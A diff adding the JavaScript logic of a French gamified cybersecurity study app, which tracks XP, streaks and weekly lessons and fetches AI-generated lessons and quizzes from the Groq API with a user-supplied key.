+  }else{state.streak=1;}
+  state.lastActive=today;
+  if(!state.streakDays)state.streakDays=[];
+  state.streakDays.push(today);
+  if(state.streakDays.length>7)state.streakDays=state.streakDays.slice(-7);
+  save();
+}
+
+function totalXP(){var xp=0;ZONES.forEach(function(z){z.weeks.forEach(function(w){if(state.done[z.id+'_'+w.n])xp+=100;});});return xp;}
+function totalDone(){return Object.values(state.done).filter(Boolean).length;}
+function totalWeeks(){return ZONES.reduce(function(a,z){return a+z.weeks.length;},0);}
+function getLvl(xp){for(var i=LEVELS.length-1;i>=0;i--)if(xp>=LEVELS[i].min)return i;return 0;}
+
+function updateAll(){
+  var xp=totalXP(),done=totalDone(),tot=totalWeeks();
+  var li=getLvl(xp),lv=LEVELS[li],nx=LEVELS[li+1];
+  var pct=nx?Math.round((xp-lv.min)/(nx.min-lv.min)*100):100;
+  el('hxp').textContent=xp.toLocaleString('fr')+' XP';
+  el('hs').textContent=state.streak||0;
+  el('hd').textContent=done;
+  el('pcav').textContent=lv.icon;
+  el('pccls').textContent=lv.name+' Nv.'+(li+1);
+  el('pcxp').style.width=Math.min(pct,100)+'%';
+  el('psxp').textContent=xp.toLocaleString('fr');
+  el('psst').textContent=(state.streak||0)+'\uD83D\uDD25';
+  el('psdn').textContent=done+'/'+tot;
+  el('pspct').textContent=tot?Math.round(done/tot*100)+'%':'0%';
+  el('srnum').textContent='\uD83D\uDD25 '+(state.streak||0);
+  var dots=el('srdots');dots.innerHTML='';
+  for(var i=6;i>=0;i--){
+    var d=new Date();d.setDate(d.getDate()-i);
+    var ds=d.toISOString().split('T')[0];
+    var dot=document.createElement('div');
+    dot.className='sdot'+(state.streakDays&&state.streakDays.includes(ds)?' on':'');
+    dots.appendChild(dot);
+  }
+}
+
+function renderMap(){
+  updateAll();
+  var g=el('zonesgrid');g.innerHTML='';
+  // Debug: check ZONES loaded
+  if(!ZONES||!ZONES.length){
+    g.innerHTML='<div style="color:red;font-family:monospace;padding:1rem;font-size:12px">ERREUR: ZONES vide ou undefined. ZONES='+JSON.stringify(typeof ZONES)+'</div>';
+    return;
+  }
+  try{
+  ZONES.forEach(function(z){
+    var done=z.weeks.filter(function(w){return state.done[z.id+'_'+w.n];}).length;
+    var pct=Math.round(done/z.weeks.length*100);
+    var card=document.createElement('div');card.className='zone';
+    var glow=document.createElement('div');
+    glow.style.cssText='position:absolute;inset:0;background:radial-gradient(ellipse at top left,'+z.glow+',transparent 60%);pointer-events:none';
+    card.appendChild(glow);
+    function addDiv(cls,txt){var d=document.createElement('div');d.className=cls;d.textContent=txt;card.appendChild(d);}
+    addDiv('zone-icon',z.icon);addDiv('zone-name',z.name);addDiv('zone-desc',z.desc);
+    var bar=document.createElement('div');bar.className='zone-bar';
+    var fill=document.createElement('div');fill.className='zone-barfill';fill.style.cssText='width:'+pct+'%;background:'+z.color;
+    bar.appendChild(fill);card.appendChild(bar);
+    var meta=document.createElement('div');meta.className='zone-meta';
+    var s1=document.createElement('span');s1.style.color=z.color;s1.textContent=done+'/'+z.weeks.length;
+    var s2=document.createElement('span');s2.style.color=z.color;s2.textContent=pct+'%';
+    meta.appendChild(s1);meta.appendChild(s2);card.appendChild(meta);
+    card.addEventListener('click',(function(zid){return function(){openZone(zid);};})(z.id));
+    g.appendChild(card);
+  });
+  }catch(err){
+    g.innerHTML='<div style="color:red;font-family:monospace;padding:1rem;font-size:11px">ERREUR renderMap: '+err.message+'</div>';
+  }
+}
+
+function openZone(zid){
+  curZone=ZONES.find(function(z){return z.id===zid;});
+  el('zhtitle').textContent=curZone.icon+' '+curZone.name;
+  el('zhsub').textContent=curZone.desc;
+  var wrap=el('weekswrap');wrap.innerHTML='';
+  var mnames=['MOIS 1','MOIS 2','MOIS 3','MOIS 4','MOIS 5','MOIS 6','MOIS 7','MOIS 8'];
+  var byM={};
+  curZone.weeks.forEach(function(w,i){var m=Math.floor(i/4);if(!byM[m])byM[m]=[];byM[m].push(w);});
+  Object.keys(byM).forEach(function(m){
+    var block=document.createElement('div');block.className='month-block';
+    var lbl=document.createElement('div');lbl.className='mlabel';lbl.textContent='// '+mnames[m]+' ──────────';block.appendChild(lbl);
+    var list=document.createElement('div');list.className='wklist';
+    byM[m].forEach(function(w){
+      var key=curZone.id+'_'+w.n;
+      var isDone=!!state.done[key],isRead=!!state.coursRead[key];
+      var card=document.createElement('div');card.className='wkcard'+(isDone?' done':'');
+      var hdr=document.createElement('div');hdr.className='wkhdr';
+      var num=document.createElement('div');num.className='wk-num';num.style.color=curZone.color;num.style.borderColor=curZone.color;num.textContent=String(w.n).padStart(2,'0');
+      var info=document.createElement('div');info.className='wk-info';
+      var t=document.createElement('div');t.className='wk-title';t.textContent=w.title;
+      var s=document.createElement('div');s.className='wk-sub';s.textContent=w.sub;
+      info.appendChild(t);info.appendChild(s);
+      var xp=document.createElement('span');xp.className='wk-xp';xp.textContent='+100XP';
+      var ico=document.createElement('span');ico.className='wk-ico';ico.textContent=isDone?'\u2705':isRead?'\uD83D\uDCD6':'\u25B6';
+      hdr.appendChild(num);hdr.appendChild(info);hdr.appendChild(xp);hdr.appendChild(ico);
+      var bar=document.createElement('div');bar.className='wkbar';
+      var bf=document.createElement('div');bf.className='wkbarfill';bf.style.cssText='width:'+(isDone?100:isRead?50:0)+'%;background:'+curZone.color;
+      bar.appendChild(bf);card.appendChild(hdr);card.appendChild(bar);
+      card.addEventListener('click',(function(wn){return function(){openLesson(wn);};})(w.n));
+      list.appendChild(card);
+    });
+    block.appendChild(list);wrap.appendChild(block);
+  });
+  showScreen('zone-screen');
+}
+
+function openLesson(wn){
+  curWeek=curZone.weeks.find(function(w){return w.n===wn;});
+  el('lbackbtn').onclick=function(){goMap();};
+  el('lhtitle').textContent=curZone.icon+' S'+wn+' \u2014 '+curWeek.title;
+  el('tcours').classList.add('on');el('tqcm').classList.remove('on');el('tqcm').classList.add('locked');
+  el('courscontent').style.display='block';el('qcmcontent').style.display='none';
+  renderCours();showScreen('lesson-screen');window.scrollTo(0,0);
+}
+
+function mkBlock(){var d=document.createElement('div');d.className='cblock';return d;}
+function addEy(b,t){var e=document.createElement('div');e.className='cey';e.textContent=t;b.appendChild(e);}
+
+function renderCours(){
+  var w=curWeek,cont=el('courscontent');cont.innerHTML='';
+  var key=curZone.id+'_'+w.n;state.coursRead[key]=true;save();
+
+  var aiBlock=mkBlock();addEy(aiBlock,'// COURS \u2014 '+w.title.toUpperCase());
+  var aiBody=document.createElement('div');aiBody.className='cbody';
+  var sp=document.createElement('div');sp.className='spinner';
+  var msg=document.createElement('div');msg.style.cssText='text-align:center;padding:1rem';
+  msg.appendChild(sp);
+  var txt=document.createElement('p');txt.style.cssText='font-size:10px;color:var(--text2);margin-top:.5rem';txt.textContent='Chargement du cours IA...';
+  msg.appendChild(txt);aiBody.appendChild(msg);aiBlock.appendChild(aiBody);cont.appendChild(aiBlock);
+  loadAICours(w,aiBody);
+
+  var b=mkBlock();addEy(b,'// OBJECTIFS S'+w.n);
+  var ul=document.createElement('ul');ul.className='clist';
+  w.topics.forEach(function(t){var li=document.createElement('li');li.textContent=t;ul.appendChild(li);});
+  b.appendChild(ul);cont.appendChild(b);
+
+  if(w.code){
+    var b2=mkBlock();addEy(b2,'// CODE EXEMPLE');
+    var code=document.createElement('div');code.className='ccode';code.textContent=w.code;
+    b2.appendChild(code);cont.appendChild(b2);
+  }
+  if(w.tip||w.warn){
+    var b3=mkBlock();
+    if(w.tip){var tt=document.createElement('div');tt.className='ctip';tt.textContent=w.tip;b3.appendChild(tt);}
+    if(w.warn){var ww=document.createElement('div');ww.className='cwarn';ww.textContent=w.warn;b3.appendChild(ww);}
+    cont.appendChild(b3);
+  }
+  if(w.resources&&w.resources.length){
+    var b4=mkBlock();addEy(b4,'// RESSOURCES');
+    var rd=document.createElement('div');rd.className='cres';
+    w.resources.forEach(function(r){
+      var a=document.createElement('a');a.className='creslink';a.href=r.u;a.target='_blank';a.rel='noopener';a.textContent='\u2197 '+r.l;rd.appendChild(a);
+    });
+    b4.appendChild(rd);cont.appendChild(b4);
+  }
+  var cta=document.createElement('button');cta.className='cta-go';cta.textContent='\uD83C\uDFAF COURS LU \u2014 G\u00C9N\u00C9RER LE QCM IA';
+  cta.addEventListener('click',unlockQCM);cont.appendChild(cta);
+  el('tqcm').classList.remove('locked');
+}
+
+async function loadAICours(w,targetEl){
+  if(!state.apiKey||state.apiKey.length<10){
+    targetEl.innerHTML='';
+    var p=document.createElement('p');p.style.cssText='color:var(--text2);font-size:12px;line-height:1.7';
+    p.textContent='Configure ta cl\u00E9 API Groq pour acc\u00E9der aux cours IA. Sans cl\u00E9, utilise les objectifs et exemples ci-dessous.';
+    targetEl.appendChild(p);return;
+  }
+  var prompt='Tu es un prof expert en '+curZone.name+'. R\u00E9dige un cours clair sur "'+w.title+'" pour un lyc\u00E9en en Terminale STI2D SIN visant une alternance en cybers\u00E9curit\u00E9.\n\nSujets : '+w.topics.join(', ')+'\n\nFormat : explique le POURQUOI (int\u00E9r\u00EAt pratique), les notions avec analogies simples, 2 exemples concrets en s\u00E9curit\u00E9, et 3 points cl\u00E9s \u00E0 retenir. Ton : direct, motivant. 200-300 mots. Texte uniquement, pas de JSON.';
+  try{
+    var resp=await fetch('https://api.groq.com/openai/v1/chat/completions',{
+      method:'POST',
+      headers:{'Content-Type':'application/json','Authorization':'Bearer '+state.apiKey},
+      body:JSON.stringify({model:'llama-3.1-8b-instant',max_tokens:600,temperature:0.6,messages:[{role:'user',content:prompt}]})
+    });
+    if(!resp.ok)throw new Error('Erreur API '+resp.status);
+    var data=await resp.json();
+    var text=(data.choices[0].message.content||'').trim();
+    targetEl.innerHTML='';
+    text.split('\n').forEach(function(line){
+      line=line.trim();if(!line)return;
+      var d=document.createElement('p');d.style.cssText='font-size:12px;color:var(--text2);line-height:1.7;margin:.3rem 0';
+      if(line.startsWith('#')){d.style.cssText='font-family:var(--pixel);font-size:8px;color:var(--cyan);margin:10px 0 5px';}
+      else if(line.match(/^[-*]/)){d.style.cssText='padding:.2rem 0 .2rem 1rem;position:relative;color:var(--text2);font-size:12px;line-height:1.6';d.innerHTML='\u25B8 '+line.replace(/^[-*]\s*/,'');targetEl.appendChild(d);return;}
+      d.textContent=line.replace(/^#+\s*/,'');targetEl.appendChild(d);
+    });
+  }catch(e){
+    targetEl.innerHTML='';
+    var p=document.createElement('p');p.style.cssText='color:var(--text3);font-size:11px';p.textContent='Cours IA indisponible \u2014 '+e.message;targetEl.appendChild(p);
+  }
+}
+
+function unlockQCM(){
+  if(!state.apiKey||state.apiKey.length<10){showApiModal();toast('Configure ta cl\u00E9 API !');return;}
+  switchTab('qcm');
+}
+function tryQCM(){
+  var key=curZone.id+'_'+curWeek.n;
+  if(!state.coursRead[key]){toast('Lis le cours d\'abord !');return;}
+  if(!state.apiKey||state.apiKey.length<10){showApiModal();return;}
+  switchTab('qcm');
+}
+function switchTab(tab){
+  var isc=tab==='cours';
+  el('tcours').classList.toggle('on',isc);el('tqcm').classList.toggle('on',!isc);
+  el('courscontent').style.display=isc?'block':'none';el('qcmcontent').style.display=isc?'none':'block';
+  if(!isc)loadQCM();
+}
+
+async function loadQCM(){
+  var key=curZone.id+'_'+curWeek.n;
+  if(state.done[key]){renderDone();return;}
+  var c=el('qcmcontent');c.innerHTML='';
+  var ld=document.createElement('div');ld.className='qloading';
+  var sp=document.createElement('div');sp.className='spinner';ld.appendChild(sp);
+  ld.appendChild(document.createTextNode(' G\u00E9n\u00E9ration QCM IA...'));c.appendChild(ld);
+  var prompt='Tu es formateur expert en '+curZone.name+'. Cours : "'+curWeek.title+'". Sujets : '+curWeek.topics.join(', ')+'\n\nG\u00E9n\u00E8re exactement 5 questions. Retourne UNIQUEMENT ce JSON (pas de markdown) :\n{"questions":[{"type":"qcm4","question":"...","choices":["A","B","C","D"],"correct":0,"explanation":"..."},{"type":"tf","question":"...","correct":true,"explanation":"..."},{"type":"qcm4","question":"...","choices":["A","B","C","D"],"correct":2,"explanation":"..."},{"type":"tf","question":"...","correct":false,"explanation":"..."},{"type":"qcm4","question":"...","choices":["A","B","C","D"],"correct":1,"explanation":"..."}]}\n\nR\u00E8gles : questions pr\u00E9cises et techniques, explication 1 phrase, en fran\u00E7ais.';
+  try{
+    var resp=await fetch('https://api.groq.com/openai/v1/chat/completions',{
+      method:'POST',
+      headers:{'Content-Type':'application/json','Authorization':'Bearer '+state.apiKey},
+      body:JSON.stringify({model:'llama-3.1-8b-instant',max_tokens:1200,temperature:0.7,messages:[{role:'user',content:prompt}]})
+    });
+    if(!resp.ok){var err=await resp.json();throw new Error(err.error?err.error.message:'Erreur '+resp.status);}
+    var data=await resp.json();
+    var text=(data.choices[0].message.content||'').trim().replace(/```json\n?/g,'').replace(/```\n?/g,'').trim();
+    renderQCM(JSON.parse(text).questions);
+  }catch(e){
+    c.innerHTML='';
+    var ed=document.createElement('div');ed.className='qloading';ed.textContent='Erreur : '+e.message;c.appendChild(ed);
+    var rb=document.createElement('button');rb.className='cta-go';rb.textContent='R\u00C9ESSAYER';rb.addEventListener('click',loadQCM);c.appendChild(rb);
+  }
+}
+
+function renderDone(){
+  var c=el('qcmcontent');c.innerHTML='';
+  var d=document.createElement('div');d.className='qloading';d.textContent='Mission d\u00E9j\u00E0 valid\u00E9e ! +100 XP';c.appendChild(d);
+  var btn=document.createElement('button');btn.className='cta-go';btn.textContent='REJOUER';
+  btn.addEventListener('click',function(){state.done[curZone.id+'_'+curWeek.n]=false;save();loadQCM();});c.appendChild(btn);
+}
+
+function renderQCM(qs){
+  var c=el('qcmcontent');c.innerHTML='';
+  qAns=Array(qs.length).fill(false);qOk=Array(qs.length).fill(false);
+  var sb=document.createElement('div');sb.className='qscore';
+  sb.innerHTML='<div class="qsico">\uD83C\uDFAF</div><div class="qsinfo"><div class="qslbl">SCORE QCM IA</div><div class="qstrk"><div class="qsfill" id="qsf" style="width:0%"></div></div><div class="qsnums" id="qsn">0 / '+qs.length+'</div></div>';
+  c.appendChild(sb);
+  qs.forEach(function(q,qi){
+    var card=document.createElement('div');card.className='qcard';card.id='qcard-'+qi;
+    var num=document.createElement('div');num.className='qnum';num.textContent='Question '+(qi+1)+' / '+qs.length;card.appendChild(num);
+    var badge=document.createElement('div');badge.className='qbadge '+(q.type==='tf'?'btf':'bqcm');badge.textContent=q.type==='tf'?'VRAI / FAUX':'4 CHOIX';card.appendChild(badge);
+    var qq=document.createElement('div');qq.className='qquestion';qq.textContent=q.question;card.appendChild(qq);
+    if(q.type==='qcm4'){
+      var ch=document.createElement('div');ch.className='choices';
+      var letters=['A','B','C','D'];
+      (q.choices||[]).forEach(function(txt,ci){
+        var btn=document.createElement('div');btn.className='choice';
+        var cl=document.createElement('div');cl.className='cl';cl.textContent=letters[ci];
+        var sp=document.createElement('span');sp.textContent=txt;
+        btn.appendChild(cl);btn.appendChild(sp);
+        btn.addEventListener('click',(function(qi2,ci2,q2){return function(){ansQ4(qi2,ci2,q2,qs.length);};})(qi,ci,q));
+        ch.appendChild(btn);
+      });
+      card.appendChild(ch);
+    }else{
+      var tw=document.createElement('div');tw.className='tf-wrap';
+      var tb=document.createElement('div');tb.className='tfbtn';tb.textContent='VRAI';
+      tb.addEventListener('click',(function(qi2,q2){return function(){ansTF(qi2,true,q2,qs.length);};})(qi,q));
+      var fb2=document.createElement('div');fb2.className='tfbtn';fb2.textContent='FAUX';
+      fb2.addEventListener('click',(function(qi2,q2){return function(){ansTF(qi2,false,q2,qs.length);};})(qi,q));
+      tw.appendChild(tb);tw.appendChild(fb2);card.appendChild(tw);
+    }
+    var fb=document.createElement('div');fb.className='qfb';fb.id='qfb-'+qi;card.appendChild(fb);
+    c.appendChild(card);
+  });
+}
+
+function ansQ4(qi,ci,q,tot){
+  if(qAns[qi])return;qAns[qi]=true;
+  var ok=ci===q.correct;qOk[qi]=ok;
+  document.getElementById('qcard-'+qi).querySelectorAll('.choice').forEach(function(e,i){
+    e.classList.add('ans');
+    if(i===q.correct)e.classList.add('correct');
+    else if(i===ci&&!ok)e.classList.add('wrong');
+  });
+  showFB(qi,ok,q.explanation);updScore(tot);checkDone(tot);
+}
+function ansTF(qi,val,q,tot){
+  if(qAns[qi])return;qAns[qi]=true;
+  var ok=val===q.correct;qOk[qi]=ok;
+  document.getElementById('qcard-'+qi).querySelectorAll('.tfbtn').forEach(function(e){
+    e.classList.add('ans');
+    var iT=e.textContent==='VRAI';
+    if(iT===q.correct)e.classList.add('correct');
+    else if(iT===val&&!ok)e.classList.add('wrong');
+  });
+  showFB(qi,ok,q.explanation);updScore(tot);checkDone(tot);
+}
+function showFB(qi,ok,expl){
+  var fb=el('qfb-'+qi);fb.className='qfb show '+(ok?'ok':'ko');
+  fb.innerHTML=(ok?'\u2705 Correct !':'\u274C Incorrect')+'<div class="expl">'+(expl||'')+'</div>';
+}
+function updScore(tot){
+  var correct=qOk.filter(Boolean).length,pct=Math.round(correct/tot*100);
+  var f=el('qsf'),n=el('qsn');if(f)f.style.width=pct+'%';if(n)n.textContent=correct+' / '+tot;
+}
+function checkDone(tot){
+  if(!qAns.every(Boolean))return;
+  var correct=qOk.filter(Boolean).length,passed=correct>=Math.ceil(tot*0.6);
+  var key=curZone.id+'_'+curWeek.n;
+  setTimeout(function(){
+    if(passed&&!state.done[key]){
+      state.done[key]=true;checkStreak();save();
+      xpPop('+100 XP !');toast('Mission valid\u00E9e ! +100 XP');confetti();updateAll();
+    }else if(!passed){toast((tot-correct)+' erreur(s) \u2014 rejoue pour valider !');}
+    var qc=el('qcmcontent');
+    var btn=document.createElement('button');btn.className='cta-back';
+    btn.textContent=passed?'\uD83D\uDDFA MISSION SUIVANTE':'\uD83D\uDD04 R\u00C9ESSAYER';
+    btn.addEventListener('click',function(){passed?openZone(curZone.id):loadQCM();});
+    qc.appendChild(btn);
+  },400);
+}
+
+function xpPop(t){var e=document.createElement('div');e.className='xppop';e.style.cssText='left:'+(40+Math.random()*20)+'%;top:60%';e.textContent=t;document.body.appendChild(e);setTimeout(function(){e.remove();},1400);}
+var _tt;
+function toast(m){var t=el('toast');t.textContent=m;t.classList.add('show');clearTimeout(_tt);_tt=setTimeout(function(){t.classList.remove('show');},2500);}
+function confetti(){var cols=['#00f5ff','#a855f7','#39ff14','#ffd700','#ff3b3b'];for(var i=0;i<22;i++){var e=document.createElement('div');e.className='cfp';e.style.cssText='left:'+Math.random()*100+'vw;background:'+cols[Math.floor(Math.random()*cols.length)]+';animation-delay:'+Math.random()*.4+'s';document.body.appendChild(e);setTimeout(function(){e.remove();},2500);}}
+function goMap(){renderMap();showScreen('map-screen');}
+
+load();updateApiBtn();
+try{
+  renderMap();
+}catch(e){
+  document.getElementById('zonesgrid').innerHTML='<div style="color:red;font-family:monospace;padding:1rem;font-size:11px">BOOT ERROR: '+e.message+'<br>'+e.stack+'</div>';
+}
+
+</script>
+</body>
+</html>
